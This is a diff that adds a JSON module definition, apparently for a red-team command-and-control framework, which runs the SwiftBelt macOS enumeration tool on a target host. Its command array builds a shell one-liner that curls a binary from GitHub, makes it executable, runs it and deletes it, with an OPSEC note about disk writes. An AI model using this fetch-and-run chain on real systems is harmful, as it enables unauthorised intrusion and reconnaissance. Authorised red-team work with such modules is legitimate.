@@ -1,0 +1,38 @@
+{
+  "base": {
+    "name": "SwiftBelt",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Cedric Owens (@cedowens)"],
+    "path": ["darwin", "x64", "swift", "enumeration", "swiftbelt.json"],
+    "platform": "darwin",
+    "arch": "x64",
+    "lang": "swift",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/cedowens/SwiftBelt/master/SwiftBelt",
+    "options": [
+      {"name": "filename", "value": "SwiftBelt", "flag": "-o", "required": true, "description":"The name to save the SwiftBelt file as"},
+      {"name": "options", "value": "", "flag": "", "required": false, "description":"SwiftBelt options to run. Leave blank to run all options or -h for help"}
+    ],
+    "description": "SwiftBelt is a macOS enumerator inspired by @harmjoy's Windows-based Seatbelt enumeration tool. SwiftBelt does not utilize any command line utilities and instead uses Swift code (leveraging the Cocoa Framework, Foundation libraries, OSAKit libraries, etc.) to perform system enumeration.",
+    "notes": "View the README at https://github.com/cedowens/SwiftBelt/blob/master/README.md for a list of commands.\r\n\r\n\t**OPSEC NOTE** This module connects directly to GitHub and writes a file to disk.",
+    "commands": [
+      "/bin/sh",
+      "-c",
+      "\"curl",
+      "{{filename}}",
+      "-s",
+      "https://raw.githubusercontent.com/cedowens/SwiftBelt/master/SwiftBelt",
+      "&&",
+      "chmod +x",
+      "{{filename.Value}}",
+      "&&",
+      "./{{filename.Value}}",
+      "{{options.Value}}",
+      ";",
+      "rm",
+      "{{filename.Value}}\""
+    ],
+    "Comments": ""
+  }
+}
